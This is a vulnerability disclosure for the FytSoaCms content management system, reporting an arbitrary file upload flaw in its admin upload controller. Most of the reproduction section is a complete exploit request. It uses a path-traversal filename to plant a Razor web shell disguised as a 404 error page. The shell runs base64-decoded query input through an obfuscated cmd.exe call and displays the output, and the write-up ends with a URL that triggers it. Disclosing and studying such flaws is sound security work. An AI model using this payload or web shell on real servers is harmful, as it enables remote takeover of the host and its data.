# <font style="color:rgb(0, 0, 0);">Vulnerability Introduction</font>

<font style="color:rgb(0, 0, 0);">Project Address：</font>[https://github.com/feiyit/FytSoaCms](https://github.com/feiyit/FytSoaCms)

Project Name：[FytSoaCms](https://github.com/feiyit/FytSoaCms)

There is an arbitrary file upload vulnerability

# <font style="color:rgb(0, 0, 0);">Vulnerability Analysis</font>

The Index method in the file FytSoaCms-master\FytSoa.Api\Controllers\Admin\FileUploadController.cs

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246169515-9865f857-c5df-4bc4-8fd4-2f11175743fc.png)

<font style="color:rgba(0, 0, 0, 0.85);">Because it directly retrieves the filename and suffix from the data packet and uses them as the filename for local storage without any filtering, attackers can upload cshtml files and further take control of the server.</font>

# <font style="color:rgb(0, 0, 0);">Vulnerability Reproduction</font>

<font style="color:rgba(0, 0, 0, 0.85);">Start Redis 3.2.100 and MySQL 5.7.26</font>  
<font style="color:rgba(0, 0, 0, 0.85);">Modify FytSoaCms-master\FytSoa.Web\appsettings.json to configure MySQL and Redis connection information</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246560735-a4bae8d6-74a8-4b68-8c03-fc840bc1aaed.png)



<font style="color:rgba(0, 0, 0, 0.85) !important;">Modify the MySQL connection information in FytSoaCms-master\FytSoa.Api\appsettings.json</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246639280-f8bfba81-9f18-497e-af2c-6f88df8b2847.png)



<font style="color:rgba(0, 0, 0, 0.85);">Navigate to the </font>`<font style="color:rgba(0, 0, 0, 0.85);">FytSoaCms-master\FytSoa.Web</font>`<font style="color:rgba(0, 0, 0, 0.85);"> directory and open the command line.</font>  
<font style="color:rgba(0, 0, 0, 0.85);">Run </font>`<font style="color:rgba(0, 0, 0, 0.85);">dotnet run</font>`

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246692062-ee05a409-77a5-4d96-8a1e-578d2d44f32f.png)

`<font style="color:rgba(0, 0, 0, 0.85) !important;">.NET Core 2.2.8</font>`<font style="color:rgba(0, 0, 0, 0.85);"> may need to be installed first.</font><font style="color:rgba(0, 0, 0, 0.85) !important;"> </font>

[https://dotnet.microsoft.com/en-us/download/dotnet/2.2](https://dotnet.microsoft.com/en-us/download/dotnet/2.2)

<font style="color:rgba(0, 0, 0, 0.85) !important;"></font>

<font style="color:rgba(0, 0, 0, 0.85) !important;">Upload the file</font>

```csharp
POST /api/upload/Index HTTP/1.1
Host: localhost:4912
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary93C7QCtjWsrq4Mbu
Accept-Encoding: gzip, deflate, br, zstd
Accept: application/json, text/javascript, */*; q=0.01
sec-ch-ua-mobile: ?0
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Sec-Fetch-Dest: empty
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
Origin: http://localhost:4912
Sec-Fetch-Mode: cors
Content-Length: 539

------WebKitFormBoundary93C7QCtjWsrq4Mbu
Content-Disposition: form-data; name="file"; filename="../../../Pages/Index2.cshtml"
Content-Type: application/octet-stream


@page
@using System.Text
@model ErrorModel
@{
    ViewData["Title"] = "Error";
    Layout = null;
}
@{
    if (HttpContext.Request.Query.ContainsKey("content"))
    {
        String content = System.Text.Encoding.GetEncoding("utf-8").GetString(Convert.FromBase64String(HttpContext.Request.Query["content"]));
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "c@m@d.e@x@e".Replace("@", "");
        p.StartInfo.Arguments = "/c " + content;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        byte[] data = System.Text.Encoding.Default.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
        <pre>@Encoding.UTF8.GetString(data)</pre>
    }
}
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>QYZQ</title>
<meta name="viewpoint" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="/themes/404/404.css" />
<script src="http://cdn.feiyit.com/jquery/jquery.min.js"></script>
</head>
<body>
<div class="code">
<p>ERROR 404</p>
</div>
<div class="road">
<div class="shadow">
<div class="shelt">
<div class="head">
<div class="eyes">
<div class="lefteye">
<div class="eyeball"></div>
<div class="eyebrow"></div>
</div>
<div class="righteye">
<div class="eyeball"></div>
<div class="eyebrow"></div>
</div>
</div>
</div>
</div>
<div class="hat"></div>
<div class="bubble">
<a href="/">Go back Home?</a>
</div>
</div>
</div>
<script type="text/javascript" src="/themes/404/404.js"></script>
</body>
</html>
------WebKitFormBoundary93C7QCtjWsrq4Mbu
Content-Disposition: form-data; name="type"

a
------WebKitFormBoundary93C7QCtjWsrq4Mbu--

```

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246876752-e8b033f7-183e-47a9-83ab-bda25da6a645.png)



<font style="color:rgba(0, 0, 0, 0.85);">Access the page, and you can see that the C# code in </font>`<font style="color:rgba(0, 0, 0, 0.85);">Index2.cshtml</font>`<font style="color:rgba(0, 0, 0, 0.85);"> is executed.</font>

[http://localhost:4912/index2?content=ZGly](http://localhost:4912/index2?content=ZGly)

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1758246978974-934d15a9-3508-4703-a6ce-f3bb820fd2ad.png)



